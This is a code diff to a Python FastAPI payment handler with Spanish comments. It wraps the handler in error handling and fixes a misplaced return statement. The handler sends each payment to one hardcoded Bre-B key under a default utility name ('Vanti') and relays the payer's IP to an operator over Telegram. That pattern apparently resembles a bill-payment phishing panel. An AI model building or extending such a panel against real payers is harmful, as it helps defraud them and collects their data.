@@ -186,36 +186,42 @@ async def procesar_pago_llave(
     referencia: str = Form(...),
     monto: float = Form(...)
 ):
-    ip = get_client_ip(request)
-    tx = obtener_transaccion(tx_id)
-    
-    if tx:
-        actualizar_estado_transaccion(tx_id, "por_verificar")
-        tx["estado"] = "por_verificar"
+    try:
+        ip = get_client_ip(request)
+        tx = obtener_transaccion(tx_id)
+        
+        if tx:
+            actualizar_estado_transaccion(tx_id, "por_verificar")
+            tx["estado"] = "por_verificar"
 
-        # Broadcast al admin
-        await manager.broadcast({
-            "event": "NUEVO_PAGO_LLAVE",
-            "tx": tx,
-            "metricas": obtener_metricas()
-        })
+            # Broadcast al WebSocket de Admin
+            await manager.broadcast({
+                "event": "NUEVO_PAGO_LLAVE",
+                "tx": tx,
+                "metricas": obtener_metricas()
+            })
 
-        # Alerta por Telegram
-        enviar_mensaje_telegram(
-            f"🔑 <b>¡Nuevo pago con Llave BRE-B!</b>\n"
-            f"• <b>Llave usada:</b> <code>0093310444</code>\n"
-            f"• <b>Empresa:</b> {tx.get('empresa', 'Vanti')}\n"
-            f"• <b>Referencia:</b> {referencia}\n"
-            f"• <b>Monto:</b> ${monto:,.0f}\n"
-            f"• <b>IP:</b> {ip}"
+            # Alerta por Telegram
+            empresa_nombre = tx.get('empresa', 'Vanti') if isinstance(tx, dict) else 'Vanti'
+            enviar_mensaje_telegram(
+                f"🔑 <b>¡Nuevo pago con Llave BRE-B!</b>\n"
+                f"• <b>Llave usada:</b> <code>0093310444</code>\n"
+                f"• <b>Empresa:</b> {empresa_nombre}\n"
+                f"• <b>Referencia:</b> {referencia}\n"
+                f"• <b>Monto:</b> ${monto:,.0f}\n"
+                f"• <b>IP:</b> {ip}"
+            )
+
+        # Renderizado compatible con todas las versiones de FastAPI
+        return templates.TemplateResponse(
+            request=request,
+            name="esperando.html",
+            context={"tx_id": tx_id}
         )
 
-   # ✅ CORRECTO
-return templates.TemplateResponse(
-    request=request, 
-    name="esperando.html", 
-    context={"tx_id": tx_id}
-)
+    except Exception as e:
+        print(f"[ERROR CRÍTICO EN PROCESAR PAGO LLAVE]: {e}")
+        raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/notificar_pago", response_class=HTMLResponse)
 async def notificar_pago(request: Request, tx_id: int = Form(...)):
